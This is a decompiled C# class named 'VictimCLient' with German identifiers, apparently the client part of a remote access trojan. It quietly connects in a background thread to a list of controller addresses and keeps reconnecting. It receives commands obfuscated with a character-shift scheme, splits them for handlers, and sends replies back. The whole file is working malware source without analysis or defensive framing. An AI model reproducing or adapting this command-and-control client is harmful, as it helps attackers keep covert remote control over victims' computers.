using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

public class VictimCLient
{
	public delegate void OnConnectEventHandler();

	public delegate void OnReconnectEventHandler();

	public delegate void NewMessageEventHandler(string[] Befehle);

	private OnConnectEventHandler OnConnectEvent;

	private OnReconnectEventHandler OnReconnectEvent;

	private NewMessageEventHandler NewMessageEvent;

	private bool Verbunden;

	private StreamWriter STW;

	private StreamReader STR;

	private TcpClient TcpC;

	private int I;

	public event OnConnectEventHandler OnConnect
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		add
		{
			OnConnectEvent = (OnConnectEventHandler)Delegate.Combine(OnConnectEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		remove
		{
			OnConnectEvent = (OnConnectEventHandler)Delegate.Remove(OnConnectEvent, value);
		}
	}

	public event OnReconnectEventHandler OnReconnect
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		add
		{
			OnReconnectEvent = (OnReconnectEventHandler)Delegate.Combine(OnReconnectEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		remove
		{
			OnReconnectEvent = (OnReconnectEventHandler)Delegate.Remove(OnReconnectEvent, value);
		}
	}

	public event NewMessageEventHandler NewMessage
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		add
		{
			NewMessageEvent = (NewMessageEventHandler)Delegate.Combine(NewMessageEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		remove
		{
			NewMessageEvent = (NewMessageEventHandler)Delegate.Remove(NewMessageEvent, value);
		}
	}

	public VictimCLient()
	{
		Verbunden = false;
		I = 0;
	}

	public void Reconnect()
	{
		OnReconnectEvent?.Invoke();
		TcpC.Close();
		STW.Close();
		STR.Close();
		Verbunden = false;
		Thread.Sleep(Module2.ReconnectTime);
		ConnectToServer();
	}

	public void Senden(string Text)
	{
		try
		{
			STW.WriteLine(method_2(Text));
			STW.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Start()
	{
		Thread thread = new Thread(ConnectToServer);
		thread.IsBackground = true;
		thread.Start();
	}

	private void method_0()
	{
		try
		{
			while (true)
			{
				string[] befehle = Strings.Split(method_1(STR.ReadLine()), GClass0.smethod_0("'Ĩȩ\u0322"), -1, (CompareMethod)0);
				NewMessageEvent?.Invoke(befehle);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Reconnect();
			ProjectData.ClearProjectError();
		}
	}

	public void Deisconnect()
	{
		TcpC.Close();
		STW.Close();
		STR.Close();
	}

	private void ConnectToServer()
	{
		checked
		{
			while (!Verbunden)
			{
				try
				{
					if (I > Module2.VerbindungsDaten.Count - 1)
					{
						I = 0;
						Thread.Sleep(Module2.ReconnectTime);
					}
					TcpC = new TcpClient();
					TcpC.Connect(Module2.VerbindungsDaten[I].IpAdresse, Module2.VerbindungsDaten[I].ConnectPort);
					STW = new StreamWriter(TcpC.GetStream());
					STR = new StreamReader(TcpC.GetStream());
					Module2._Ipadresse = Module2.VerbindungsDaten[I].IpAdresse;
					Module2._ConnectionPort = Module2.VerbindungsDaten[I].ConnectPort;
					Module2._TransferPort = Module2.VerbindungsDaten[I].TransferPort;
					Verbunden = true;
					OnConnectEvent?.Invoke();
					method_0();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					I++;
					Verbunden = false;
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private string method_1(string Text)
	{
		return Decrypt(Text);
	}

	private string method_2(string Text)
	{
		return Encrypt(Text);
	}

	public string Decrypt(string sText)
	{
		string text = null;
		long num = Strings.Len(sText);
		checked
		{
			for (long num2 = 1L; num2 <= num; num2++)
			{
				text += Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(sText, (int)num2, 1)) - 1));
			}
			return text;
		}
	}

	public string Encrypt(string sText)
	{
		string text = null;
		long num = Strings.Len(sText);
		checked
		{
			for (long num2 = 1L; num2 <= num; num2++)
			{
				text += Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(sText, (int)num2, 1)) + 1));
			}
			return text;
		}
	}
}
